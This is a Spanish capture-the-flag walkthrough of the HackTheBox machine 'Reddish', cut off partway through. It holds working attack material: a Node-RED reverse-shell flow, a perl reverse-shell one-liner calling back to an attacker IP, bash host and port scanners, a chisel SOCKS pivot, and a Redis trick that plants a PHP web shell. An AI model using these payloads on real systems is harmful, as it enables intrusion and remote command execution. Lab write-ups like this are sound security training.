---
title: Reddish - Insane (HTB)
permalink: /Reddish-HTB-Writeup/
tags: 
  - "Linux"
  - "Insane"
  - "Node-RED"
  - "Redis"
  - "Dynamic Port Forwarding"
  - "Chisel"
  - "Socat"
  - "Proxychains"
  - "Pivoting"
  - "Rsync"
  - "Cron Jobs"
  - "Disk Mount"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Reddish - Insane (HTB)
seo_description: Practica pivoting en entornos Linux comprometiendo máquinas en redes internas y abusa de tareas cron para vencer Reddish.
excerpt: Practica pivoting en entornos Linux comprometiendo máquinas en redes internas y abusa de tareas cron para vencer Reddish.
header:
  overlay_image: /assets/images/headers/reddish-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/reddish-hackthebox.jpg
---


![image-center](/assets/images/posts/reddish-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing Node-RED, Abusing Redis, Dynamic Port Forwarding (`chisel`), HTTP Request without `curl` Command, Pivoting (`socat` + `proxychains`), Abusing `rsync` - Wildcard Filename, Abusing Cron Jobs, Disk Mount
{: .notice--primary}

# Introducción

Reddish es una máquina Linux de dificultad `Insane` en HackTheBox donde debemos aplicar conceptos de Pivoting y explotación de diferentes servicios para ir comprometiendo redes internas hasta llegar a la máquina real y vencer Reddish.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping 10.10.10.94 -c 1
PING 10.10.10.94 (10.10.10.94) 56(84) bytes of data.
64 bytes from 10.10.10.94: icmp_seq=1 ttl=63 time=220 ms

--- 10.10.10.94 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 219.915/219.915/219.915/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo de puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.94 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 10:17 EDT
Nmap scan report for 10.10.10.94
Host is up (0.53s latency).
Not shown: 52848 closed tcp ports (reset), 12686 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1880/tcp open  vsat-control

Nmap done: 1 IP address (1 host up) scanned in 30.01 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo con el fin de detectar la versión y los servicios que se ejecutan en los puertos abiertos que hemos descubierto

~~~ bash
nmap -p 1880 -sVC 10.10.10.94 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 10:20 EDT
Nmap scan report for 10.10.10.94
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.19 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis - `Node-RED`

Haremos un escaneo de tecnologías web que puedan estar presentes, intentaremos detectar versiones y saber a qué nos enfrentamos

~~~ bash
whatweb http://10.10.10.94:1880                                      
http://10.10.10.94:1880 [404 Not Found] Country[RESERVED][ZZ], HTML5, IP[10.10.10.94], Title[Error], UncommonHeaders[content-security-policy,x-content-type-options], X-Powered-By[Express]
~~~

Vemos que no detectará nada porque la web genera un error al hacer una solicitud. Si navegamos hasta la web, vemos el siguiente error


![image-center](/assets/images/posts/reddish-web-analysis.png)
{: .align-center}

Al enviar una solicitud con el método `POST`, podemos ver el servidor nos responde lo siguiente

~~~ bash
 curl -X POST http://10.10.10.94:1880 ;echo
{"id":"a23b389789868b5a58b1b26873e34800","ip":"::ffff:10.10.14.12","path":"/red/{id}"}
~~~

Nos envía un JSON con una serie de datos, un `id`, `IP` y `path`, si navegamos hasta `/red/{id}` usando el ID que se nos proporciona, ingresaremos a la siguiente web

![image-center](/assets/images/posts/reddish-node-red-analysis.png)
{: .align-center}

Vemos una interfaz donde podemos arrastrar nodos y crear diagramas de flujo, por el título podemos identificar la tecnología `Node-RED`

> Node-RED es una **herramienta de programación visual basada en flujo, ideal para conectar dispositivos, APIs y servicios web**. Permite construir aplicaciones sin necesidad de escribir código, utilizando un editor gráfico basado en navegador donde se conectan nodos predefinidos.
{: .notice--info}
<br>


# Intrusión / Explotación - `nodered`
---
## Abusing Node-RED 

Podemos usar nodos que nos permitan enviar conexiones remotas además de ejecutar comandos en el sistema gracias a los nodos `tcp` y `exec`

![image-center](/assets/images/posts/reddish-abusing-nodered.png)
{: .align-center}

Aprovecharemos esto para enviarnos una reverse shell, y lo podemos hacer de la siguiente manera

### Reverse Shell via JSON Import

Utilizaremos el siguiente JSON para establecer una conexión con nuestra máquina

- https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/refs/heads/master/node-red-reverse-shell.json

~~~ bash
 wget https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/refs/heads/master/node-red-reverse-shell.json
--2025-05-05 10:38:33--  https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/refs/heads/master/node-red-reverse-shell.json
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 717 [text/plain]
Saving to: ‘node-red-reverse-shell.json.1’

node-red-reverse-shell.json.1                 100%[=================================================================================================>]     717  --.-KB/s    in 0s      

2025-05-05 10:38:33 (32.4 MB/s) - ‘node-red-reverse-shell.json.1’ saved [717/717]
~~~

Ahora debemos editar el archivo para configurar los parámetros antes de enviarlos al servidor, ajustaremos los valores de `host` y `port`, ingresando nuestra IP de HTB y un puerto para recibir la conexión

~~~ bash
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.12","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
~~~

Para copiarlo directamente podemos utilizar la herramienta `xclip`

~~~ bash
cat node-red-reverse-shell.json -p | jq | xclip -sel clip
~~~

Una vez lo tengamos copiado, nos dirigimos a la web para importar este JSON, nos dirigimos a `Menu` > `Import` > `Clipboard`, y pegamos el JSON, enseguida presionamos `Import`, debería haberse creado un nuevo `Flow` con los siguientes nodos

![image-center](/assets/images/posts/reddish-abusing-nodered-2.png)
{: .align-center}

También podríamos haber hecho esto manualmente arrastrando los nodos y configurando el primero para conectarse a nuestra IP por el puerto seleccionado, y configurar el último nodo de salida en `Reply to TCP`

![image-center](/assets/images/posts/reddish-abusing-nodered-3.png)
{: .align-center}

Ahora pondremos el puerto a la escucha que seleccionamos para recibir la conexión

~~~ bash
nc -lvnp 443
~~~

Si presionamos `Deploy`, deberíamos recibir la conexión de la siguiente forma

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 46766
whoami
root
~~~


## (Failed) TTY Treatment

Haremos un tratamiento de la shell para que sea más interactiva y poder operar de forma más cómoda

Si intentamos hacerlo directamente desde esta consola, se va pal carajo todo

~~~ bash
[object Object]script /dev/null -c bash
^Z
[1]  + 68418 suspended  nc -lvnp 443
root@parrot reddish \# stty raw -echo; fg                  
[1]  + 68418 continued  nc -lvnp 443
                                    /bin/sh: 1: r: not found
                                                            [object Object]/bin/sh: 1: e: not found
                                                                                                   [object Object]/bin/sh: 1: s: not found
                                                                                                                                          [object Object]/bin/sh: 1: et: not found
                                                                                                                                                                                  [object Object][object Object]
~~~


## Reverse Shell - `perl`

Existe el lenguaje de programación `perl` dentro de la máquina, podemos enviar otra shell para poder hacer un tratamiento posterior

~~~ bash
[object Object]which perl 
/usr/bin/perl
~~~

Utilizaremos este `oneliner` para enviarnos una conexión nuevamente al puerto `443`. Podemos visitar el siguiente enlace que corresponde a una `Cheat Sheet` u hoja de trucos para establecer reverse shells en diferentes lenguajes de programación o línea de comandos

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Editaremos las variables `i` y `p` para ingresar nuestra IP de HackTheBox y el puerto por el que recibiremos la shell

~~~ bash
cat -p revshell                                  
perl -e 'use Socket;$i="10.10.14.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

A continuación cerraremos la pestaña actual para volver a poner el puerto a la escucha, como la conexión desde `node-RED` vuelve intentar establecerse, al esperar un momento deberíamos recibir la conexión automáticamente.

Cuando estemos nuevamente en la consola, enviaremos la siguiente línea para enviarnos la shell con `perl`

~~~ bash
[object Object] perl -e 'use Socket;$i="10.10.14.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Desde nuestro listener ya deberíamos haber recibido la shell, y ya por apariencia se ve mejor 

~~~ bash
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.94] 34702
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
~~~


## TTY Treatment

Continuaremos con el tratamiento como lo hacemos de forma habitual

~~~ bash
\# script /dev/null -c bash
root@nodered:/node-red# ^Z
[1]  + 101864 suspended  nc -lvnp 443
root@parrot reddish \# stty raw -echo; fg
[1]  + 101864 continued  nc -lvnp 443
                                     reset xterm
~~~

Para finalizar el tratamiento, cambiaremos el valor de la variable de entorno `TERM` y ajustaremos las proporciones de la consola para que se ajuste a nuestra pantalla

~~~ bash
root@nodered:/node-red# export TERM=xterm
root@nodered:/node-red# stty rows 44 columns 184
~~~
<br>


# Reconocimiento - `www`
---
## Network Interfaces

Si listamos la IP de las interfaces de red, podemos ver que estamos dentro de un contenedor y no de la máquina real

~~~ bash
root@nodered:/node-red# hostname -I 
172.18.0.2 172.19.0.4
~~~

También podemos hacerlo con el comando `ip` para ver más información

~~~ bash
root@nodered:/tmp# ip a | grep inet
    inet 127.0.0.1/8 scope host lo
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
~~~


## Ping Sweep

Haremos descubrimiento de hosts en estas subredes, para eso usaremos el comando `ping`, que por suerte está instalado en el contenedor

~~~ bash
root@nodered:/node-red# which ping 
/bin/ping
~~~

Podemos utilizar el comando ping para ir detectando hosts activos en el segmento de red que estamos operando de la siguiente forma

~~~ bash
root@nodered:/node-red# timeout 1 ping -c 1 172.18.0.12 &>/dev/null && echo 'Host up!'
~~~

Si vemos el código de estado del comando anterior con un valor de `0`, significa que el comando ha sido exitoso, si su valor es `1`, indica un error

~~~ bash
root@nodered:/node-red# ping -c 1 172.18.0.1 &>/dev/null
root@nodered:/node-red# echo $?
0
root@nodered:/node-red# ping -c 1 172.18.0.10 &>/dev/null
root@nodered:/node-red# echo $?
124
~~~

Podemos ejecutar el siguiente `oneliner` que haga un ping en bucle a cada host de la subred y en base al código de estado validar si está activo gracias al operador `&&`

~~~ bash
root@nodered:/node-red# timeout 1 bash -c 'for i in $(seq 1 254); do ping -c 1 172.18.0.$i &>/dev/null && echo "Host 172.18.0.$i is up!" & done; wait'
Host 172.18.0.2 is up!
Host 172.18.0.1 is up!

root@nodered:/node-red# timeout 1 bash -c 'for i in $(seq 1 254); do ping -c 1 172.19.0.$i &>/dev/null && echo "Host 172.18.0.$i is up!" & done; wait'
Host 172.18.0.3 is up!
Host 172.18.0.4 is up!
Host 172.18.0.2 is up!
Host 172.18.0.1 is up!
~~~


## Ping Sweep - `bash` Scripting

Podemos crear un script en bash que se encargue de descubrir hosts activos en ambas redes

~~~ bash
#!/bin/bash

function ctrl_c(){
	echo -e "\nExiting..."
	exit 1
}

trap ctrl_c INT

subnets=($@)
echo -e "\nScanning network(s): (${subnets[@]})"

for network in ${subnets[@]}; do
	for host in $(seq 1 254); do

		prefix=$(echo "$network" | tr -t ' ' '\n'| cut -d '/' -f1 | cut -d'.' -f1-3)
		timeout 1 ping -c 1 $prefix.$host &>/dev/null && echo -e "\t[+] Host $prefix.$host" is up! &

	done; wait
done;
~~~

Podemos enviarlo en `base64` para no tener que establecer nuevas conexiones con este contenedor. Desde nuestra máquina hacemos la codificación y copiamos directamente en el portapapeles

~~~ bash
cat host_discover.sh| base64 -w 0 | xclip -sel clip
~~~

- `-w 0`: Evitar saltos de línea

En la máquina víctima decodificaremos el script y lo guardaremos, posteriormente le asignaremos permisos de ejecución

~~~ bash
root@nodered:/tmp# echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5FeGl0aW5nLi4uIgoJZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKc3VibmV0cz0oJEApCmVjaG8gLWUgIlxuU2Nhbm5pbmcgbmVd29yayhzKTogKCR7c3VibmV0c1tAXX0pIgoKZm9yIG5ldHdvcmsgaW4gJHtzdWJuZXRzW0BdfTsgZG8KCWZvciBob3N0IGluICQoc2VxIDEgMjU0KTsgZG8KCgkJcHJlZml4PSQoZWNobyAiJG5ldHdvcmsiIHwgdHIgLXQgJyAnICdcbid8IGNdCAtZCAnLycgLWYxIHwgY3V0IC1kJy4nIC1mMS0zKQoJCXRpbWVvdXQgMSBwaW5nIC1jIDEgJHByZWZpeC4kaG9zdCAmPi9kZXYvbnVsbCAmJiBlY2hvIC1lICJcdFsrXSBIb3N0ICRwcmVmaXguJGhvc3QiIGlzIHVwISAmCgoJZG9uZTsgd2FdApkb25lOwoKCg== | base64 -d > host_discover.sh

root@nodered:/tmp# chmod +x host_discover.sh
~~~

### Discovering

Si ejecutamos el script veremos los equipos que e encuentran activos en las subredes

~~~ bash
root@nodered:/tmp# ./host_discover.sh 172.18.0.0/16 172.19.0.0/16 

Scanning network(s): (172.18.0.0/16 172.19.0.0/16)
	[+] Host 172.18.0.1 is up!
	[+] Host 172.18.0.2 is up!
	[+] Host 172.19.0.1 is up!
	[+] Host 172.19.0.2 is up!
	[+] Host 172.19.0.3 is up!
	[+] Host 172.19.0.4 is up!
~~~

Podríamos guardar esta información en un archivo para recordar las IP activas. Recordemos que el contenedor  `nodered` posee IPs asignadas en estos segmentos

~~~ bash
cat internal_hosts

    [+] Host 172.18.0.1 is up!
    [+] Host 172.18.0.2 is up! <- nodered (Container) 
    [+] Host 172.19.0.1 is up!
    [+] Host 172.19.0.2 is up!
    [+] Host 172.19.0.3 is up! <- nodered (Container)
    [+] Host 172.19.0.4 is up!
~~~


## Open Ports Scan

Como ya tenemos una lista de equipos activos en las subredes, nuestro siguiente objetivo será identificar puertos abiertos para cada host

### Understanding `/dev/tcp` File

En bash, existe un archivo especial que nos permite establecer conexiones por TCP, este archivo está en `/dev/tcp`.

Podemos usarlo para enviar información a puertos de un host de la siguiente manera

~~~ bash
echo '' > /dev/tcp/IP/PORT
~~~

Esto se encarga de establecer una comunicación TCP con la IP por el puerto especificado. Aprovecharemos esto para descubrir puertos abiertos en cada una de las IP que descubrimos.

Podemos usar nuevamente operadores para comprobar que un puerto esté abierto o cerrado en cada host

~~~ bash
# Abierto
root@nodered:/tmp# timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.1/1880 && echo '[+] Open port' || echo '[-] Closed port'"
[+] Open port

# Cerrado
root@nodered:/tmp# timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.1/1881 && echo '[+] Open port' || echo '[-] Closed port'"
bash: connect: Connection refused
bash: /dev/tcp/172.18.0.1/1881: Connection refused
[-] Closed port
~~~


## Open Port Scan - `bash` Scripting

Modificaremos la lógica del script para en vez de hacer una traza ICMP a cada host, que vaya iterando por un rango de puertos de cada IP

~~~ bash
#!/bin/bash

function ctrl_c(){
    echo -e "\nExiting..."
    exit 1
}

trap ctrl_c INT

echo -e "\nScanning hosts(s) from: ($1)"

while IFS= read -r host
do
    for port in $(seq 1 10000); do
        timeout 1 bash -c "echo '' > /dev/tcp/$host/$port && echo -e '\t[+] Port $port/open on host $host'" 2>/dev/null &
    done; wait
done < "$1"
~~~

En vez de transferir el script, copiaremos su contenido en `base64` con el siguiente comando

~~~ bash
cat port_scanner.sh | base64 -w 0 | xclip -sel clip
~~~

Pegaremos la cadena en `base64` en el contendor, lo guardaremos y le daremos permisos de ejecución al script de la siguiente forma

~~~ bash
root@nodered:/tmp# echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5FeGl0aW5nLi4uIgoJZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKZWNobyAtZSAiXG5TY2FubmluZyBob3N0cyhzKSBmcm9tOiAoJDEpIgoKd2hpbGUgSUZTPSByZWFkIC1yIGhvc3QKZG8KCWZvciBwb3J0IGluICQoc2VxIDEgMTAwMDApOyBkbwoJCXRpbWVvdXQgMSBiYXNoIC1jICJlY2hvICcnID4gL2Rldi90Y3AvJGhvc3QvJHBvcnQgJiYgZWNobyAtZSAnXHRbK10gUG9ydCAkcG9ydC9vcGVuIG9uIGhvc3QgJGhvc3QnIiAyPi9kZXYvbnVsbCAmCglkb25lOyB3YWl0CmRvbmUgPCAiJDEiCgoKCgoK | base64 -d > port_scanner.sh

root@nodered:/tmp# chmod +x port_scanner.sh 
~~~

Crearemos un archivo en nuestra máquina que contenga los hosts activos, iremos leyendo cada línea de él

~~~ bash
cat hosts.txt

172.18.0.1
172.19.0.1
172.19.0.2
172.19.0.4
~~~

Copiaremos el archivo de la misma forma que lo hicimos con el script (en `base64`)

~~~ bash
cat hosts.txt | base64 -w 0 | xclip -sel clip
~~~

Pegamos la cadena, decodificamos en `base64` y guardamos con un nombre, por ejemplo `hosts.txt`

~~~ bash
root@nodered:/tmp# echo MTcyLjE4LjAuMQoxNzIuMTkuMC4xCjE3Mi4xOS4wLjIKMTcyLjE5LjAuNAo= | base64 -d > hosts.txt
~~~

### Scanning

Ejecutaremos la herramienta que acabamos de crear para buscar puertos abiertos en todas las IP. Ahora solamente necesitamos editar el archivo `hosts.txt` para escanear otras IP

~~~ bash
root@nodered:/tmp# ./port_scanner.sh hosts.txt 

Scanning hosts(s) from: (hosts.txt)
	[+] Port 1880/open on host 172.18.0.1
	[+] Port 6379/open on host 172.19.0.2
	[+] Port 80/open on host 172.19.0.4
~~~

Hemos descubierto tres puertos en las IP, de forma que el mapeo de la red quedaría de la siguiente forma

~~~ bash
    [+] Host 172.18.0.1 is up!
        [+] Port 1880/open

    [+] Host 172.18.0.2 is up! <-- nodered
    [+] Host 172.19.0.1 is up!
    [+] Host 172.19.0.2 is up!
        [+] Port 6379/open

    [+] Host 172.19.0.3 is up! <-- nodered
    [+] Host 172.19.0.4 is up!
        [+] Port 80/open 
~~~


## Dynamic Port Forwarding - `chisel`

Abriremos un túnel SOCKS con la ayuda de `chisel` para comunicar los puertos abiertos que solamente desde el segmento del contenedor podemos alcanzar, esta técnica es conocida como `Port Forwarding`

Instalaremos la herramienta `chisel` ejecutando esta serie de comandos

~~~ bash
git clone https://github.com/jpillora/chisel

cd chisel
go build -ldflags "-s -w" .
upx chisel # si quieres reducir el tamaño del binario
~~~~

Compartiremos el binario a través de la red abriendo un servidor HTTP en nuestra máquina

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Si tienes problemas con `libc`, puedes descargar un binario pre-compilado desde el reposotorio oficial y descomprimirlo con `gunzip`

~~~ bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

gunzip chisel_1.7.6_amd64.gz
./chisel_1.76_amd64.gz
~~~

### HTTP Request without `curl` Command

El contenedor no tiene herramientas como `curl`, `wget` o `nc`, así que usaremos el poder de `/dev/tcp` para definir la siguiente función en el contenedor para hacer solicitudes HTTP.

Pegaremos esta función en la shell del contenedor para definirla y poder utilizarla

~~~ bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
~~~

Inmediatamente después usaremos la función de la siguiente manera para descargar `chisel` en el contenedor, además le daremos permisos de ejecución

~~~ bash
root@nodered:/tmp# __curl http://10.10.14.12/chisel > chisel
~~~

Puedes validar la integridad del archivo computando el hash `MD5` resultante en ambas máquinas, deberían ser iguales

~~~ bash
md5sum chisel
58037ef897ec155a03ea193df4ec618a  chisel
~~~

### Tunneling

Iniciaremos un servidor con `chisel` en modo inverso, esto significa que será la máquina `nodered` la que gestione el reenvío de puertos hacia nuestro servidor

~~~ bash
chisel server -p 8000 --reverse

2025/05/05 23:55:39 server: Reverse tunnelling enabled
2025/05/05 23:55:39 server: Fingerprint 5sNYhYK5RxLv7Im/5JsR5lbV2fLZlzVdLlrPoAaODCY=
2025/05/05 23:55:39 server: Listening on http://0.0.0.0:8000
~~~

Conectaremos `nodered` a nuestro servidor con `chisel` al puerto `8000` para iniciar el reenvío

~~~ bash
root@nodered:/tmp# ./chisel client 10.10.14.12:8000 R:socks

2025/05/06 03:58:35 client: Connecting to ws://10.10.14.12:8000
2025/05/06 03:58:36 client: Connected (Latency 189.893199ms)
~~~

Desde el servidor `chisel` en nuestra máquina, se abrirá una sesión en el puerto `1080`. Este nuevo túnel SOCKS5 será nuestro canal de comunicación con las redes internas de las que el contenedor `nodered` forma parte

~~~ bash
2025/05/05 23:56:09 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
~~~

### `proxychains` Setup

Configuraremos `proxychains` para poder hacer uso del túnel, podemos consultar la configuración necesaria rápidamente gracias al comando `grep`, donde necesitaremos habilitar las siguientes opciones

- `strict_chain`: Descomentar esta línea y comentar las demás que hagan alusión al modo de proxy (`dynamic_chain`, `random_chain`)
- `socks5 127.0.0.1 1080`: Especificamos el puerto por el cual se encuentra la sesión activa

~~~ bash
cat /etc/proxychains.conf | grep -E "strict_chain|socks"
strict_chain
#            	socks5	192.168.67.78	1080	lamer	secret
#		socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
~~~

Desde `FoxyProxy` podemos configurar el proxy SOCKS para poder visualizar páginas web

![image-center](/assets/images/posts/reddish-foxyproxy.png)
{: .align-center}


## Nmap Scan through `proxychains`

Una vez configuramos `proxychains`, podemos utilizarlo para dirigir un escaneo de servicios con `nmap` a cada host de las redes internas, la lista de hosts que encontramos era la siguiente

~~~ bash
cat hosts.txt

172.18.0.1
172.19.0.1
172.19.0.2
172.19.0.4
~~~

Con `nmap` podemos escanear múltiples hosts enviando el archivo

~~~ bash
proxychains -q nmap -p 80,6379 --open -sT -n -Pn -sVC -iL hosts.txt -oN services_internal_hosts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 00:25 EDT
Nmap scan report for 172.19.0.2
Host is up (0.59s latency).
Not shown: 1 closed tcp port (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Nmap scan report for 172.19.0.3
Host is up (0.48s latency).
Not shown: 1 closed tcp port (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Reddish

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 28.64 seconds
~~~


## Web Analysis - `www`

Si visitamos la web de la dirección IP `172.19.0.3`, veremos el siguiente mensaje

![image-center](/assets/images/posts/reddish-web-analysis-www.png)
{: .align-center}

Si revisamos el código fuente, podemos darnos cuenta que existe un directorio `8924d0549008565c554f8128cd11fda4`

~~~ javascript
$(document).ready(function () {
								incrCounter();
						    getData();
						});

						function getData() {
						    $.ajax({
						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
											console.log("Number of hits:", data)
						        },
						        error: function () {
						        }
						    });
						}

						function incrCounter() {
						    $.ajax({
						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
						        cache: false,
						        dataType: "text",
						        success: function (data) {
				              console.log("HITS incremented:", data);
						        },
						        error: function () {
						        }
						    });
						}

						/*
							* TODO
							*
							* 1. Share the web folder with the database container (Done)
							* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
							* ...Still don't know how to complete it...
						*/
						function backupDatabase() {
								$.ajax({
										url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
										cache: false,
										dataType: "text",
										success: function (data) {
											console.log("Database saved:", data);
										},
										error: function () {
										}
								});
						}


~~~

Si visitamos el directorio se nos señala un error que indica que no tenemos permisos para acceder 

![image-center](/assets/images/posts/reddish-web-analysis-www-2.png)
{: .align-center}

Además cada vez que recargamos la página, podemos notar en la consola del navegador que se registra un valor `hits`, que incrementa cada vez que recargamos la web

![image-center](/assets/images/posts/reddish-web-analysis-www-3.png)
{: .align-center}


## `redis` Analysis - `www`

> Redis es un sistema de almacenamiento de datos de clave/valor en memoria, de código abierto, que -se utiliza principalmente como caché o como base de datos de respuesta rápida.
{: .notice--info}

Si nos conectamos al puerto `6379`, podremos utilizar el servicio `redis` de la IP `172.19.0.2`, en el siguiente enlace podemos encontrar una guía para hacer pentesting a esta tecnología

- https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html

Para ver información general, podemos ejecutar `INFO`

~~~ bash
proxychains -q nc -v 172.19.0.2 6379 
172.19.0.2 [172.19.0.2] 6379 (redis) open : Operation now in progress
INFO
$2741
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:cce7cc41d26597f7
redis_mode:standalone
os:Linux 4.15.0-213-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:6.4.0
...
...
~~~

Este servicio puede ser usado como **base de datos, broker de mensajes o como almacenamiento de caché**, las bases de datos en `redis` comienzan desde `0`, la podemos seleccionar con la palabra `SELECT`

~~~ bash
# Keyspace
db0:keys=1,expires=0,avg_ttl=0

SELECT 0
+OK
~~~

Si listamos los valores existentes podemos ver un valor numérico llamado `hits`, este se parece al valor que vimos en la web

~~~ bash
keys *  

*1
$4
hits
get hits 
$1
3
get hits 
$1
4
~~~

Haciendo unas pruebas, podremos detectar que la web de `172.19.0.4` posee un vínculo con el servicio de `redis` de la IP `172.19.0.2` por la variable `hits`

![image-center](/assets/images/posts/reddish-redis-analysis.png)
{: .align-center}
<br>


# Intrusión / Explotación - `www`
---
## Redis RCE

Para poder abusar en remoto de este servicio, instalaremos `redis-tools` para conectarnos al servidor de `redis`

~~~ bash
apt-get install redis-tools
~~~

Crearemos un archivo `php` malicioso que ejecute un comando a través de un parámetro `cmd` (necesariamente debemos agregar saltos de línea en el archivo por un posible conflicto con metadatos que se insertarán automáticamente)

~~~ php



<?php
	system($_REQUEST['cmd']);
?>


~~~

Subiremos el archivo al servidor de la siguiente manera haciendo uso de `proxychains`

~~~ bash
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 -x set reverse
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 config set dbfilename "cmd.php"
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 save
~~~

Crearemos un script para automatizar la subida del archivo, este será tan sencillo que solamente ejecutará las instrucciones secuencialmente

~~~ bash
cat redis_abuse.sh -p
#!/bin/bash

cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 -x set reverse
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
cat cmd.php | proxychains -q redis-cli -h 172.19.0.2 config set dbfilename "cmd.php"
